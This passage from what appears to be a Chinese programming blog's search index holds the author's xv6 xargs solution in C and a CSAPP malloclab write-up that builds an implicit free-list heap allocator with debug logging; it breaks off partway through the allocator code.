title="xargs"></a>xargs</h4><p>即将管道符前面的参数放到argv[1]所运行的程序参数列表上。因此我们需要构造参数列表。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/param.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> </span><br><span class="line"><span class="title function_">ParseLine</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ((read(<span class="number">0</span>, buf+i, <span class="keyword">sizeof</span>(<span class="type">char</span>))) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(buf[i] == <span class="string">&#x27;\0&#x27;</span> || buf[i] == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          buf[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      i++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(i != <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">      buf[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> </span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  <span class="type">char</span> *line[MAXARG];</span><br><span class="line">  <span class="type">char</span> buf[MAXARG];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; argc; i++) &#123;</span><br><span class="line">    line[i - <span class="number">1</span>] = argv[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (ParseLine(buf)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">      line[argc - <span class="number">1</span>] = buf;</span><br><span class="line">      line[argc] = <span class="number">0</span>;<span class="comment">//截断</span></span><br><span class="line">      exec(argv[<span class="number">1</span>], line);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      wait(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
          <category> xv6 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
            <tag> xv6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript学习记录0x3</title>
      <link href="/2024/06/28/js/javascript%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>/2024/06/28/js/javascript%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<p>js for in 和 for of 的区别</p>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>malloclab</title>
      <link href="/2024/06/25/csapp/malloclab/"/>
      <url>/2024/06/25/csapp/malloclab/</url>
      
        <content type="html"><![CDATA[<h3 id="0x1-介绍"><a href="#0x1-介绍" class="headerlink" title="0x1 介绍"></a>0x1 介绍</h3><p>可以从手册得知，我们需要修改mm.c里面的三个函数<code>mm_malloc</code>、<code>mm_free</code>、<code>mm_realloc</code>来实现堆的相关功能。教师们为我们编写了如此庞大的测试环境，那么我们也要认真完成它。</p><p>由于lab自带的版本是每次请求时都执行sbrk系统调用。我们知道，系统调用会是陷入内核，花费大量时间，那么接下来我们要做的就是减少系统调用的次数。</p><p>下图为自带版本的测试，可以看到内存利用率并不高 ，并且有部分测试并未通过。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/80a87295cf1969b7c18f2a6d91758d9.png" alt="80a87295cf1969b7c18f2a6d91758d9"></p><h3 id="0x2-隐式空闲列表"><a href="#0x2-隐式空闲列表" class="headerlink" title="0x2 隐式空闲列表"></a>0x2 隐式空闲列表</h3><p>我们进行第一次修改，为其实现一个简单的分配器。</p><p>注意事项：</p><ul><li><p>这里的块指针bp指向第一个有效载荷</p></li><li><p>可以利用宏定义将复杂操作定义为类似函数操作的方法（PS：在预处理期间替换，而函数内联等操作则在编译期替换）</p></li><li><p>sbrk返回值</p></li></ul><div class="table-container"><table><thead><tr><th>返回值</th><th>描述</th></tr></thead><tbody><tr><td>(void *)-1</td><td>调用失败，无法扩展数据段。通常伴随设置<code>errno</code>来描述具体错误。</td></tr><tr><td>非空指针</td><td>调用成功，返回指向数据段新分配空间的指针。</td></tr></tbody></table></div><p>首先是宏定义，宏定义可以简化操作，避免一些难以察觉的错误。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* single word (4) or double word (8) alignment */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGNMENT 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* rounds up to the nearest multiple of ALIGNMENT */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGN(size) (((size) + (ALIGNMENT - 1)) &amp; ~0x7)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_T_SIZE (ALIGN(sizeof(size_t)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WSIZE 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DSIZE 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKSIZE (1 &lt;&lt; 12)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX(a, b) ((a) &gt; (b) ? (a) : (b))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN(a, b) ((a) &lt; (b) ? (a) : (b))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET(p) (*(unsigned int *)(p))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT(p, val) (*(unsigned int *)(p) = (val))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_SIZE(p) (GET(p) &amp; ~0x7)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_ALLOC(p) (GET(p) &amp; 0x1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HDRP(bp) ((char *)(bp)-WSIZE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE((char *)(bp)-WSIZE))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_BLKP(bp) ((char *)(bp)-GET_SIZE((char *)(bp)-DSIZE))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACK(size, alloc) ((size) | (alloc))</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *heap_listp = <span class="number">0</span>; <span class="comment">//初始堆地址</span></span><br></pre></td></tr></table></figure><p>手册提到，我们可以实现mm_check来检查内存分配器是否在工作。</p><p>这里我实现了两个日志函数，<code>log_message_function</code>用来记录函数执行顺序，<code>mm_check</code>用来打印空闲链表，这里的日志会严重影响运行速度，于是使用宏来控制日志的开关。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  #define DEBUG</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_message(fmt, ...) log_message_function(fmt, __VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mm_check() mm_check_function()</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_message(fmt, ...)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mm_check()</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">log_message_function</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *fmt, ...)</span> &#123;</span><br><span class="line">  FILE *file;</span><br><span class="line">  file = fopen(<span class="string">&quot;log.log&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">  va_list args;</span><br><span class="line">  va_start(args, fmt);</span><br><span class="line">  <span class="built_in">vfprintf</span>(file, fmt, args);</span><br><span class="line">  va_end(args);</span><br><span class="line">  fclose(file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">mm_check_function</span><span class="params">()</span> &#123;</span><br><span class="line">  FILE *file;</span><br><span class="line">  file = fopen(<span class="string">&quot;log.log&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (file == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(file, <span class="string">&quot;---------------------链表----------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(file, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *p = heap_listp;</span><br><span class="line">  <span class="keyword">while</span> (GET_SIZE(HDRP(p)) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(p));</span><br><span class="line">    <span class="type">size_t</span> alloc = GET_ALLOC(HDRP(p));</span><br><span class="line">    <span class="built_in">fprintf</span>(file, <span class="string">&quot;pointer：%p   size:%d    alloc:%d\n&quot;</span>, p, size, alloc);</span><br><span class="line">    p = NEXT_BLKP(p);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">fprintf</span>(file, <span class="string">&quot;-----------------------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(file, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (fclose(file) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化堆空间，主要是分配头部和脚部，使其符合空闲链表的组织方式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mm_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> ((heap_listp = mem_sbrk(<span class="number">4</span> * WSIZE)) == (<span class="type">void</span> *)<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  PUT(heap_listp, <span class="number">0</span>);</span><br><span class="line">  PUT(heap_listp + (<span class="number">1</span> * WSIZE), PACK(DSIZE, <span class="number">1</span>));</span><br><span class="line">  PUT(heap_listp + (<span class="number">2</span> * WSIZE), PACK(DSIZE, <span class="number">1</span>));</span><br><span class="line">  PUT(heap_listp + (<span class="number">3</span> * WSIZE), PACK(<span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line">  heap_listp += (<span class="number">4</span> * WSIZE);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (extend_heap(CHUNKSIZE / WSIZE) == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>mm_malloc</strong>：首先要将要分配的空间大小进行8字节对齐，调用<code>find_fit</code>函数：</p><ul><li>当有空闲空间时，调用<code>place()</code>函数，将此块标记为已分配。</li><li>当无空闲空间时，调用 <code>extend_heap</code>函数，增加并合并堆内存，然后调用<code>place()</code>函数。</li></ul><p><strong>mm_free:</strong></p><ul><li>将已分配的块标记为空闲块，然后调用<code>coalesce()</code>函数，按照下图四种情况进行合并。</li></ul><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240626234600066.png" alt="image-20240626234600066"></p><p><strong>mm_realloc:</strong></p><ul><li>按照参数输入的不同执行不同的操作。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">mm_malloc</span><span class="params">(<span class="type">size_t</span> size)</span> &#123;</span><br><span class="line"></span><br><span class="line">  log_message(<span class="string">&quot;malloc %d\n&quot;</span>, size);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (size == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> asize = ALIGN(size + SIZE_T_SIZE); <span class="comment">//加入头部尾部并对齐</span></span><br><span class="line">  <span class="type">size_t</span> extendsize;</span><br><span class="line">  <span class="type">char</span> *bp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((bp = find_fit(asize)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    place(bp, asize);</span><br><span class="line">    log_message(<span class="string">&quot;malloc:success! pointer:%p   size:%d     alloc:%d  \n\n&quot;</span>, bp,</span><br><span class="line">                GET_SIZE(HDRP(bp)), GET_ALLOC(HDRP(bp)));</span><br><span class="line">    mm_check();</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    extendsize = MAX(CHUNKSIZE, asize);</span><br><span class="line">    log_message(<span class="string">&quot;We need %d!!!\n&quot;</span>, extendsize);</span><br><span class="line">    <span class="keyword">if</span> ((bp = extend_heap(extendsize / WSIZE)) == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      place(bp, asize);</span><br><span class="line">      log_message(<span class="string">&quot;malloc:success! pointer:%p   size:%d     alloc:%d  \n\n&quot;</span>, bp,</span><br><span class="line">                  GET_SIZE(HDRP(bp)), GET_ALLOC(HDRP(bp)));</span><br><span class="line">      mm_check();</span><br><span class="line">      <span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mm_free</span><span class="params">(<span class="type">void</span> *ptr)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (ptr == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="type">size_t</span> size = GET_SIZE(HDRP(ptr));</span><br><span class="line">  PUT(HDRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">  PUT(FTRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">  coalesce(ptr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mm_realloc</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> oldsize;</span><br><span class="line">  <span class="type">void</span> *newptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (size == <span class="number">0</span>) &#123;</span><br><span class="line">    mm_free(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ptr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> mm_malloc(size);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  newptr = mm_malloc(size);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!newptr) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  oldsize = GET_SIZE(HDRP(ptr));</span><br><span class="line">  <span class="keyword">if</span> (size &lt; oldsize)</span><br><span class="line">    oldsize = size;</span><br><span class="line">  <span class="built_in">memcpy</span>(newptr, ptr, oldsize);</span><br><span class="line"></span><br><span class="line">  mm_free(ptr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> newptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来的则是各种子函数，主要是注意堆操作的方式，仔细检查。在这里，log_message()可以帮助我们调试，快速确定合并方式，执行结果，函数执行顺序等重要方式。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">coalesce</span><span class="params">(<span class="type">void</span> *bp)</span> &#123;</span><br><span class="line">  <span class="type">size_t</span> prev_alloc = GET_ALLOC(HDRP(PREV_BLKP(bp)));</span><br><span class="line">  <span class="type">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">  <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (prev_alloc &amp;&amp; next_alloc) &#123; <span class="comment">/* case 1 */</span></span><br><span class="line">    log_message(<span class="string">&quot;coalesce: case 1   pointer:%p\n&quot;</span>, bp);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (prev_alloc &amp;&amp; !next_alloc) &#123; <span class="comment">/* case 2 */</span></span><br><span class="line">    size += GET_SIZE(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    log_message(<span class="string">&quot;coalesce: case 2   pointer:%p\n&quot;</span>, bp);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc &amp;&amp; next_alloc) &#123; <span class="comment">/* case 3 */</span></span><br><span class="line">    size += GET_SIZE(HDRP(PREV_BLKP(bp)));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">    bp = PREV_BLKP(bp);</span><br><span class="line"></span><br><span class="line">    log_message(<span class="string">&quot;coalesce: case 3   pointer:%p\n&quot;</span>, bp);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc &amp;&amp; !next_alloc) &#123; <span class="comment">/* case 4 */</span></span><br><span class="line">    size += GET_SIZE(HDRP(PREV_BLKP(bp))) + GET_SIZE(FTRP(NEXT_BLKP(bp)));</span><br><span class="line">    PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">    log_message(<span class="string">&quot;coalesce: case 4   pointer:%p\n&quot;</span>, bp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">char</span> *<span class="title function_">find_fit</span><span class="params">(<span class="type">size_t</span> asize)</span> &#123;</span><br><span class="line">  <span class="type">char</span> *p = heap_listp;</span><br><span class="line">  <span class="keyword">while</span> (GET_SIZE(HDRP(p)) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(p));</span><br><span class="line">    <span class="type">size_t</span> alloc = GET_ALLOC(HDRP(p));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!alloc &amp;&amp; size &gt;= asize) &#123;</span><br><span class="line">      log_message(<span class="string">&quot;fit_block   poniter:%p size:%d   alloc:%d\n&quot;</span>, p, size,</span><br><span class="line">                  alloc);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p = NEXT_BLKP(p);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">place</span><span class="params">(<span class="type">char</span> *ptr, <span class="type">size_t</span> asize)</span> &#123;</span><br><span class="line">  <span class="type">size_t</span> size = GET_SIZE(HDRP(ptr));</span><br><span class="line">  <span class="keyword">if</span> ((size - asize) &gt;= (<span class="number">2</span> * DSIZE)) &#123;</span><br><span class="line">    PUT(HDRP(ptr), PACK(asize, <span class="number">1</span>));</span><br><span class="line">    PUT(FTRP(ptr), PACK(asize, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    ptr = NEXT_BLKP(ptr);</span><br><span class="line">    PUT(HDRP(ptr), PACK(size - asize, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(ptr), PACK(size - asize, <span class="number">0</span>));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    PUT(HDRP(ptr), PACK(size, <span class="number">1</span>));</span><br><span class="line">    PUT(FTRP(ptr), PACK(size, <span class="number">1</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">extend_heap</span><span class="params">(<span class="type">size_t</span> words)</span> &#123;</span><br><span class="line">  <span class="type">char</span> *bp;</span><br><span class="line">  <span class="type">size_t</span> size;</span><br><span class="line">  size = (words % <span class="number">2</span>) ? ((words + <span class="number">1</span>) * WSIZE) : (words * WSIZE); <span class="comment">//写反了</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">long</span>)(bp = mem_sbrk(size)) == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">  PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">  PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line">  log_message(<span class="string">&quot;extend_heap:   